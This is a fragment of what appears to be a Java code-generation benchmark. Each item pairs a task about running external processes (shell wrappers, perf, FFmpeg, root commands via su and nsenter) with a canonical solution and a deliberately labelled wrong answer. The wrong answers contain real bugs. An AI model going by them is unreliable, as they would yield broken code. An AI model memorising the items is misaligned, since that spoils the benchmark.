    "Instruction": "Task Description: Create a Java class that implements shell command execution functionality, allowing for command input, output reading, and process management.\n\nClass Description: ProcessShell is a class that provides an interface for executing shell commands, managing the process lifecycle, and handling input/output streams. It extends AbstractShell and supports both regular and root command execution.\n\nAttributes:\n- mProcess: Process - The running process instance\n- mCommandOutputStream: DataOutputStream - Stream for writing commands to the process\n- mSucceedReader: BufferedReader - Reader for standard output stream\n- mErrorReader: BufferedReader - Reader for error output stream\n- mSucceedOutput: StringBuilder - Buffer for storing standard output\n- mErrorOutput: StringBuilder - Buffer for storing error output\n\nMethods:\n- init(String initialCommand) -> void - Initializes the shell process with the given command\n- exec(String command) -> void - Executes the given command in the shell\n- exit() -> void - Terminates the process and cleans up resources\n- exitAndWaitFor() -> void - Sends exit command, waits for process completion, then exits\n- waitFor() -> int - Waits for the process to complete and returns exit code\n- readAll() -> ProcessShell - Reads all available output (both standard and error)\n- readSucceedOutput() -> ProcessShell - Reads standard output\n- readErrorOutput() -> ProcessShell - Reads error output\n- getSucceedOutput() -> StringBuilder - Returns the standard output buffer\n- getErrorOutput() -> StringBuilder - Returns the error output buffer\n- getProcess() -> Process - Returns the process instance\n- getSucceedReader() -> BufferedReader - Returns the standard output reader\n- getErrorReader() -> BufferedReader - Returns the error output reader",
    "Canonical_solution": "import android.util.Log;\nimport com.stardust.autojs.runtime.api.AbstractShell;\nimport com.stardust.autojs.runtime.exception.ScriptInterruptedException;\nimport com.stardust.autojs.util.ProcessUtils;\nimport com.stardust.pio.UncheckedIOException;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\npublic class ProcessShell extends AbstractShell {\n\n    private static final String TAG = \"ProcessShell\";\n    private Process mProcess;\n    private DataOutputStream mCommandOutputStream;\n    private BufferedReader mSucceedReader;\n    private BufferedReader mErrorReader;\n    private StringBuilder mSucceedOutput = new StringBuilder();\n    private StringBuilder mErrorOutput = new StringBuilder();\n\n    public ProcessShell() {\n    }\n\n    public ProcessShell(boolean root) {\n        super(root);\n    }\n\n    @Override\n    protected void init(String initialCommand) {\n        try {\n            mProcess = new ProcessBuilder(initialCommand).redirectErrorStream(true).start();\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    @Override\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.writeBytes(command);\n            if (!command.endsWith(COMMAND_LINE_END)) {\n                mCommandOutputStream.writeBytes(COMMAND_LINE_END);\n            }\n            mCommandOutputStream.flush();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void exit() {\n        if (mProcess != null) {\n            Log.d(TAG, \"exit: pid = \" + ProcessUtils.getProcessPid(mProcess));\n            mProcess.destroy();\n            mProcess = null;\n        }\n        if (mSucceedReader != null) {\n            try {\n                mSucceedReader.close();\n            } catch (IOException ignored) {\n            }\n            mSucceedReader = null;\n        }\n        if (mErrorReader != null) {\n            try {\n                mErrorReader.close();\n            } catch (IOException ignored) {\n            }\n            mErrorReader = null;\n        }\n    }\n\n    @Override\n    public void exitAndWaitFor() {\n        exec(COMMAND_EXIT);\n        waitFor();\n        exit();\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public ProcessShell readAll() {\n        return readSucceedOutput().readErrorOutput();\n    }\n\n    public ProcessShell readSucceedOutput() {\n        read(mSucceedReader, mSucceedOutput);\n        return this;\n    }\n\n    private void read(BufferedReader reader, StringBuilder sb) {\n        try {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    public ProcessShell readErrorOutput() {\n        read(mErrorReader, mErrorOutput);\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessShell extends AbstractShell {\n    private Process mProcess;\n    private DataOutputStream mCommandOutputStream;\n    private BufferedReader mSucceedReader;\n    private BufferedReader mErrorReader;\n    private StringBuilder mSucceedOutput;\n    private StringBuilder mErrorOutput;\n\n    public ProcessShell() {\n        mSucceedOutput = new StringBuilder();\n        mErrorOutput = new StringBuilder();\n    }\n\n    public void init(String initialCommand) {\n        try {\n            mProcess = Runtime.getRuntime().exec(initialCommand);\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n            Thread succeedThread = new Thread(() -> {\n                try {\n                    String line;\n                    while ((line = mSucceedReader.readLine()) != null) {\n                        mSucceedOutput.append(line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            Thread errorThread = new Thread(() -> {\n                try {\n                    String line;\n                    while ((line = mErrorReader.readLine()) != null) {\n                        mErrorOutput.append(line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            succeedThread.start();\n            errorThread.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.write((command + \"\\n\").getBytes());\n            mCommandOutputStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exit() {\n        if (mProcess != null) {\n            mProcess.destroy();\n        }\n    }\n\n    public void exitAndWaitFor() {\n        exit();\n        try {\n            mProcess.waitFor();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public ProcessShell readAll() {\n        try {\n            while (mSucceedReader.ready()) {\n                mSucceedOutput.append(mSucceedReader.readLine());\n            }\n            while (mErrorReader.ready()) {\n                mErrorOutput.append(mErrorReader.readLine());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public ProcessShell readSucceedOutput() {\n        try {\n            while (mSucceedReader.ready()) {\n                mSucceedOutput.append(mSucceedReader.readLine());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public ProcessShell readErrorOutput() {\n        try {\n            while (mErrorReader.ready()) {\n                mErrorOutput.append(mErrorReader.readLine());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}"
  },
  {
    "Task_id": 277,
    "Instruction": "Task Description: The task involves creating a Java class that utilizes ProcessBuilder to execute external processes, specifically for performance monitoring and data collection using the 'perf' tool. The class should handle process execution, stream management, and synchronization.\n\nClass Description: This class is designed to interact with the Linux 'perf' performance monitoring tool. It provides functionality to parse performance events and add JVM invocation options for performance recording. The class manages process execution, handles input/output streams, and ensures proper synchronization.\n\nAttributes:\n- sampleFrequency: [String] - The sampling frequency for performance recording\n- optFrequency: [OptionSpec<String>] - Configuration option for frequency setting\n- perfBinData: [File] - File object storing binary performance data (implied from context)\n- perfParsedData: [File] - File object for storing parsed performance data (implied from context)\n- requestedEventNames: [Collection<String>] - Collection of performance event names to monitor (implied from context)\n\nMethods:\n- parseEvents() -> [void] - Executes the 'perf script' command to parse binary performance data, redirects process output streams to a file, and waits for process completion\n- addJVMInvokeOptions(BenchmarkParams params) -> [Collection<String>] - Generates command-line options for 'perf record' with specified sampling frequency and events\n- InputStreamDrainer(InputStream, OutputStream) -> [void] - Helper class/thread for draining process streams (implied from context)",
    "Canonical_solution": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport org.openjdk.jmh.infra.BenchmarkParams;\nimport org.openjdk.jmh.util.Utils;\n\nprivate String sampleFrequency;\nprivate OptionSpec<String> optFrequency;\n\n@Override\nprotected void parseEvents() {\n    try (FileOutputStream fos = new FileOutputStream(perfParsedData.file())) {\n        ProcessBuilder pb = new ProcessBuilder(PerfSupport.PERF_EXEC, \"script\", \"--fields\", \"time,event,ip,sym,dso\", \"--input\", perfBinData.getAbsolutePath());\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n    } catch (IOException | InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n}\n\n@Override\npublic Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n    return Arrays.asList(PerfSupport.PERF_EXEC, \"record\", \"--freq\", String.valueOf(sampleFrequency), \"--event\", Utils.join(requestedEventNames, \",\"), \"--output\", perfBinData.getAbsolutePath());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class PerfMonitor {\n    private String sampleFrequency;\n    private OptionSpec<String> optFrequency;\n    private File perfBinData;\n    private File perfParsedData;\n    private Collection<String> requestedEventNames;\n\n    public void parseEvents() {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"perf\", \"script\", \"--input\", perfBinData.getAbsolutePath());\n            pb.redirectOutput(Files.newOutputStream(perfParsedData.toPath()));\n            pb.redirectError(Files.newOutputStream(perfParsedData.toPath()));\n            Process process = pb.start();\n\n            new Thread(() -> {\n                try (InputStream is = process.getInputStream()) {\n                    InputStreamDrainer.drain(is, new FileOutputStream(perfParsedData));\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }).start();\n\n            new Thread(() -> {\n                try (InputStream is = process.getErrorStream()) {\n                    InputStreamDrainer.drain(is, new FileOutputStream(perfParsedData));\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }).start();\n\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                // Handle error\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n        List<String> options = new ArrayList<>();\n        if (sampleFrequency != null) {\n            options.add(\"--freq=\" + sampleFrequency);\n        }\n        for (String eventName : requestedEventNames) {\n            options.add(\"--event=\" + eventName);\n        }\n        return options;\n    }\n\n    public static void InputStreamDrainer(InputStream is, OutputStream os) {\n        try {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                os.write(buffer, 0, bytesRead);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a Java function that executes an FFmpeg process to convert a video file into NUT format with raw video and audio codecs, then reads and processes the output using a NutReader.\n\nFunction Description: The function testNutReader() configures and executes an FFmpeg process to convert an input video file into NUT format with specific codec settings (rawvideo for video, pcm_s32le for audio). It then reads and processes the output stream using a NutReader with custom handlers for stream and frame events. The function ensures proper process synchronization by waiting for the FFmpeg process to complete.\n\nInput: None (uses a predefined input file Samples.big_buck_bunny_720p_1mb)\n\nOutput: None (void return type), but the function:\n1. Executes an FFmpeg conversion process\n2. Processes the output through NutReader callbacks\n3. Asserts the process completed successfully (exit code 0)\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the process\n- ExecutionException: If there's an error in process execution\n- IOException: If there's an I/O error during process handling\n- LineUnavailableException: If there's an audio line availability issue",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.List;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport javax.sound.sampled.LineUnavailableException;\n\npublic void testNutReader()\n    throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n\n    List<String> args =\n        new FFmpegBuilder()\n            .setInput(Samples.big_buck_bunny_720p_1mb)\n            .done()\n            .addStdoutOutput()\n            .setFormat(\"nut\")\n            .setVideoCodec(\"rawvideo\")\n            .setVideoPixelFormat(\"argb\")\n            .setAudioCodec(\"pcm_s32le\")\n            .done()\n            .build();\n\n    List<String> newArgs =\n        ImmutableList.<String>builder().add(FFmpeg.DEFAULT_PATH).addAll(args).build();\n\n    ProcessBuilder builder = new ProcessBuilder(newArgs);\n    Process p = builder.start();\n\n    new NutReader(\n            p.getInputStream(),\n            new NutReaderListener() {\n                @Override\n                public void stream(Stream stream) {\n                    // Audio stream handling logic\n                }\n\n                @Override\n                public void frame(Frame frame) {\n                    // Frame processing logic\n                }\n            })\n        .read();\n\n    assertEquals(0, p.waitFor());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public void testNutReader() throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n    ProcessBuilder pb = new ProcessBuilder(\"ffmpeg\", \"-i\", \"Samples.big_buck_bunny_720p_1mb\", \"-c:v\", \"rawvideo\", \"-c:a\", \"pcm_s32le\", \"output.nut\");\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n\n    Thread readerThread = new Thread(() -> {\n        try (InputStream inputStream = process.getInputStream();\n             InputStreamReader reader = new InputStreamReader(inputStream);\n             BufferedReader bufferedReader = new BufferedReader(reader)) {\n            NutReader nutReader = new NutReader(bufferedReader);\n            nutReader.setStreamHandler(new StreamHandler());\n            nutReader.setFrameHandler(new FrameHandler());\n        } catch (IOException | LineUnavailableException e) {\n            throw new RuntimeException(e);\n        }\n    });\n    readerThread.start();\n\n    int exitCode = process.waitFor();\n    if (exitCode != 0) {\n        throw new ExecutionException(\"FFmpeg process failed with exit code \" + exitCode);\n    }\n}"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Java class that facilitates interaction with external processes through command execution, providing methods for writing input, executing commands, and retrieving results, with support for timeout handling and resource cleanup.\n\nClass Description: The Command class encapsulates functionality for executing and interacting with external processes. It handles process creation, input/output stream management, command execution, and result collection, with features for line-based input, process termination, and timeout control.\n\nAttributes:\n\nprocess: [Process] - The running external process instance\nstdIn: [OutputStream] - Stream for writing input to the process\nstdOut: [File] - Temporary file storing the process's standard output\nstdErr: [File] - Temporary file storing the process's error output\nnextLine: [String] - Line separator string for command input\nexit: [String] - Command string to terminate the process\ncharset: [Charset] - Character encoding for input/output\nstartTime: [LocalDateTime] - Timestamp when the process was started\n\nMethods:\n\nof: [of(String init)] -> [Command] - Creates a Command instance with default settings\nof: [of(String init, Charset charset)] -> [Command] - Creates a Command instance with specified charset\nof: [of(String init, String nextLine, String exit, Charset charset)] -> [Command] - Creates a Command instance with custom settings\nwrite: [write(String str)] -> [Command] - Writes a string to the process's input stream\nline: [line()] -> [Command] - Writes a line separator to the process's input stream\nexit: [exit()] -> [Command] - Sends the exit command to terminate the process\nexec: [exec(String str)] -> [Command] - Executes a command string (writes input and adds line separator)\nresult: [result()] -> [CommandResult] - Waits for process completion and returns results\nresult: [result(long millis)] -> [CommandResult] - Waits with timeout for process completion\nclose: [close()] -> [void] - Terminates the process and releases resources",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.nio.charset.Charset;\nimport java.time.LocalDateTime;\nimport java.util.StringTokenizer;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Command {\n\n    public static final String NEXT_LINE = SystemUtils.lineSeparator();\n    public static final String EXIT_COMMAND = \"exit\";\n\n    private final Process process;\n    private final OutputStream stdIn;\n    private final File stdOut;\n    private final File stdErr;\n    private final String nextLine;\n    private final String exit;\n    private final Charset charset;\n    private final LocalDateTime startTime;\n\n    private Command(String init, String nextLine, String exit, Charset charset) throws IOException {\n        if (!StringUtils.hasText(init)) {\n            throw new IllegalArgumentException(\"Empty init\");\n        }\n        StringTokenizer st = new StringTokenizer(init);\n        String[] cmdArray = new String[st.countTokens()];\n        for (int i = 0; st.hasMoreTokens(); i++) {\n            cmdArray[i] = st.nextToken();\n        }\n\n        this.stdOut = FileUtils.createTemp();\n        this.stdErr = FileUtils.createTemp();\n\n        ProcessBuilder builder = new ProcessBuilder(cmdArray).redirectError(this.stdErr).redirectOutput(this.stdOut);\n        this.process = builder.start();\n        this.stdIn = this.process.getOutputStream();\n        this.nextLine = nextLine;\n        this.exit = exit;\n        this.charset = charset;\n        this.startTime = LocalDateTime.now();\n    }\n\n    public static Command of(String init) throws IOException {\n        return of(init, SystemUtils.charset());\n    }\n\n    public static Command of(String init, Charset charset) throws IOException {\n        return of(init, NEXT_LINE, EXIT_COMMAND, charset);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) throws IOException {\n        return new Command(init, nextLine, exit, charset);\n    }\n\n    public Command write(String str) throws IOException {\n        this.stdIn.write(str.getBytes(this.charset));\n        this.stdIn.flush();\n        return this;\n    }\n\n    public Command line() throws IOException {\n        return write(this.nextLine);\n    }\n\n    public Command exit() throws IOException {\n        write(this.exit);\n        return line();\n    }\n\n    public Command exec(String str) throws IOException {\n        write(str);\n        return line();\n    }\n\n    public CommandResult result() throws InterruptedException {\n        this.process.waitFor();\n        return CommandResult.of(this.stdOut, this.stdErr, this.startTime, LocalDateTime.now(), this.charset);\n    }\n\n    public CommandResult result(long millis) throws InterruptedException, CommandTimeoutException {\n        if (this.process.waitFor(millis, TimeUnit.MILLISECONDS)) {\n            return result();\n        }\n        this.process.destroyForcibly();\n        throw new CommandTimeoutException();\n    }\n\n    public void close() {\n        this.process.destroy();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class Command {\n    private final Process process;\n    private final OutputStream stdIn;\n    private final File stdOut;\n    private final File stdErr;\n    private final String nextLine;\n    private final String exit;\n    private final Charset charset;\n    private final LocalDateTime startTime;\n\n    public static Command of(String init) {\n        return new Command(init);\n    }\n\n    public static Command of(String init, Charset charset) {\n        return new Command(init, charset);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) {\n        return new Command(init, nextLine, exit, charset);\n    }\n\n    private Command(String init) {\n        this(init, StandardCharsets.UTF_8);\n    }\n\n    private Command(String init, Charset charset) {\n        this(init, null, null, charset);\n    }\n\n    private Command(String init, String nextLine, String exit, Charset charset) {\n        this.nextLine = nextLine;\n        this.exit = exit;\n        this.charset = charset;\n        this.stdOut = createTempFile(\"out\");\n        this.stdErr = createTempFile(\"err\");\n        this.startTime = LocalDateTime.now();\n        this.process = null;\n        this.stdIn = null;\n    }\n\n    public Command write(String str) {\n        if (process == null) {\n            startProcess();\n        }\n        try (BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdIn, charset))) {\n            writer.write(str);\n            writer.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public Command line() {\n        if (process == null) {\n            startProcess();\n        }\n        if (nextLine != null) {\n            write(nextLine);\n        }\n        return this;\n    }\n\n    public Command exit() {\n        if (process == null) {\n            startProcess();\n        }\n        if (exit != null) {\n            write(exit);\n        }\n        return this;\n    }\n\n    public Command exec(String str) {\n        if (process == null) {\n            startProcess();\n        }\n        write(str);\n        line();\n        return this;\n    }\n\n    public CommandResult result() {\n        return result(-1);\n    }\n\n    public CommandResult result(long millis) {\n        if (process == null) {\n            startProcess();\n        }\n        try {\n            long timeout = millis;\n            if (timeout < 0) {\n                timeout = -1;\n            }\n            long startTime = System.currentTimeMillis();\n            long endTime = startTime + timeout;\n            boolean finished = false;\n            if (process != null) {\n                int exitCode = process.waitFor();\n                finished = true;\n            } else {\n                startProcess();\n                int exitCode = process.waitFor();\n                finished = true;\n            }\n            if (!finished && timeout > 0) {\n                process.destroy();\n            }\n            String output = readFromFile(stdOut, charset);\n            String error = readFromFile(stdErr, charset);\n            return new CommandResult(output, error, process.exitValue());\n        } catch (Exception e) {\n            return new CommandResult(null, e.getMessage(), -1);\n        }\n    }\n\n    private String readFromFile(File file, Charset charset) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), charset))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n            return sb.toString();\n        }\n    }\n\n    public void close() {\n        if (process != null) {\n            process.destroy();\n            try {\n                if (stdIn != null) {\n                    stdIn.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private File createTempFile(String prefix) throws IOException {\n        return File.createTempFile(prefix, \".tmp\");\n    }\n\n    private void startProcess() throws IOException {\n        ProcessBuilder pb = new ProcessBuilder(init.split(\" \"));\n        pb.redirectOutput(new FileOutputStream(stdOut));\n        pb.redirectError(new FileOutputStream(stdErr));\n        process = pb.start();\n        stdIn = process.getOutputStream();\n    }\n}"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a Java function that executes a shell command with root privileges using ProcessBuilder, handles input/output streams, and properly manages process lifecycle and error handling.\n\nFunction Description: The function executes a given shell command with root privileges by spawning a new process through ProcessBuilder. It uses 'su' to gain root access and 'nsenter' to enter the root namespace. The function handles command safety checks, process I/O streams, error redirection, and proper resource cleanup. It returns the command output or error messages.\n\nInput: \n- cmd: String - The shell command to be executed with root privileges\n\nOutput: \n- String - The output of the executed command (stdout) or error message if execution fails. The output string is cleaned to remove trailing newlines and unnecessary error prefixes.\n\nNote: The function includes a safety check (isSafeCommand) to prevent dangerous operations, though its implementation isn't shown in the reference code.",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\n\npublic static String rootExecCmd(String cmd) {\n    if (!isSafeCommand(cmd)) return \"Cannot exec this command: Dangerous operation\";\n    StringBuilder result = new StringBuilder();\n    ProcessBuilder pb = new ProcessBuilder(\"su\");\n    Process p;\n    DataOutputStream dos = null;\n    DataInputStream dis = null;\n    try {\n        pb.redirectErrorStream(true);\n        p = pb.start();\n        dos = new DataOutputStream(p.getOutputStream());\n        dis = new DataInputStream(p.getInputStream());\n        dos.writeBytes(\"nsenter --mount=/proc/1/ns/mnt -- \" + cmd + \"\\n\");\n        dos.flush();\n        dos.writeBytes(\"exit\\n\");\n        dos.flush();\n        String line;\n        while ((line = dis.readLine()) != null) {\n            result.append(line).append(\"\\n\");\n        }\n        p.waitFor();\n    } catch (Exception e) {\n        if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n            return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n        } else {\n            return String.valueOf(e);\n        }\n    } finally {\n        if (dos != null) {\n            try {\n                dos.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n        if (dis != null) {\n            try {\n                dis.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n    }\n    if (result.length() > 0) {\n        result = new StringBuilder(result.substring(0, result.length() - 1));\n    }\n    if (!cmd.contains(\"nsenter\") && result.toString().contains(\"nsenter: exec \")) {\n        return result.toString().replace(\"nsenter: exec \", \"\");\n    } else {\n        return result.toString();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public String executeAsRoot(String cmd) {\n    if (!isSafeCommand(cmd)) {\n        return \"Command not allowed\";\n    }\n\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", \"nsenter --target 1 -i \" + cmd);\n        pb.redirectErrorStream(true);\n        Process process = pb.start();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            return output.toString().trim();\n        }\n        return output.toString().trim();\n    } catch (Exception e) {\n        return \"Error: \" + e.getMessage();\n    }\n}"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that executes an external process, captures its output (including error streams redirected to standard output), and returns the output as a string.\n\nFunction Description: The function uses Java's ProcessBuilder to start an external process specified by the given command. It redirects the error stream to the standard output stream to capture all output in one place. The function reads the process's output stream line by line, collects it into a string, and waits for the process to complete before returning the collected output.\n\nInput: \n- cmd: String[] - An array of strings representing the command to execute and its arguments.\n\nOutput: \n- String - The combined standard output and error output of the executed process, trimmed of any leading or trailing whitespace.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getProcessOutput(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n    StringBuilder processOutput = new StringBuilder();\n    try (BufferedReader processOutputReader = new BufferedReader(\n            new InputStreamReader(process.getInputStream()));) {\n        String readLine;\n        while ((readLine = processOutputReader.readLine()) != null) {\n            processOutput.append(readLine + System.lineSeparator());\n        }\n        process.waitFor();\n    }\n    return processOutput.toString().trim();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public static String executeProcess(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder pb = new ProcessBuilder(cmd);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    StringBuilder output = new StringBuilder();\n    String line;\n    while ((line = reader.readLine()) != null) {\n        output.append(line).append(\"\\n\");\n    }\n    process.waitFor();\n    return output.toString().trim();\n}"
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: Create a Java function that executes an external process using ProcessBuilder, captures its output, and handles errors appropriately.\n\nFunction Description: The function executes a shell command constructed from configuration parameters, captures the process's standard output and error streams (merged), waits for the process to complete, and returns the exit status or throws an exception if the process fails. The function handles process initialization, stream reading, and error management.\n\nInput:\n- job: Job<Object> - A job object containing configuration details\n- parameters: Map<String, Object> - A map of parameters used to construct the shell command\n\nOutput:\n- Object - Returns 0 if the process exits successfully, otherwise throws a HugeException containing the exit code and process output\n\nNote: The function includes error handling for process initialization, execution, and stream reading, with all exceptions wrapped in HugeException. The process's working directory is set to executeDir(), and error streams are redirected to standard output.",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStreamReader;\nimport java.io.LineNumberReader;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic Object call(Job<Object> job, Map<String, Object> parameters) {\n    this.checkAndCollectParameters(parameters);\n    try {\n        this.initializeConfig((ComputerJob) job);\n    } catch (Exception e) {\n        throw new HugeException(\n                \"Failed to initialize computer config file\", e);\n    }\n\n    Map<String, Object> configs = new HashMap<>();\n    configs.putAll(this.commonConfig);\n    configs.putAll(this.checkAndCollectParameters(parameters));\n\n    String[] command = this.constructShellCommands(configs);\n    LOG.info(\"Execute computer job: {}\", String.join(SPACE, command));\n\n    try {\n        ProcessBuilder builder = new ProcessBuilder(command);\n        builder.redirectErrorStream(true);\n        builder.directory(new File(executeDir()));\n\n        Process process = builder.start();\n\n        StringBuilder output = new StringBuilder();\n        try (LineNumberReader reader = new LineNumberReader(\n                new InputStreamReader(\n                        process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode == 0) {\n            return 0;\n        }\n\n        throw new HugeException(\"The computer job exit with code %s: %s\",\n                                exitCode, output);\n    } catch (HugeException e) {\n        throw e;\n    } catch (Throwable e) {\n        throw new HugeException(\"Failed to execute computer job\", e);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public int executeProcess(Job<Object> job, Map<String, Object> parameters) throws HugeException {\n    try {\n        List<String> command = (List<String>) parameters.get(\"command\");\n        if (command == null || command.isEmpty()) {\n            throw new HugeException(1, \"Command is required\");\n        }\n        ProcessBuilder pb = new ProcessBuilder(command);\n        pb.directory(job.executeDir());\n        pb.redirectErrorStream(true);\n        Process process = pb.start();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new HugeException(exitCode, output.toString());\n        }\n        return 0;\n    } catch (Exception e) {\n        throw new HugeException(1, \"Error executing process: \" + e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 284,
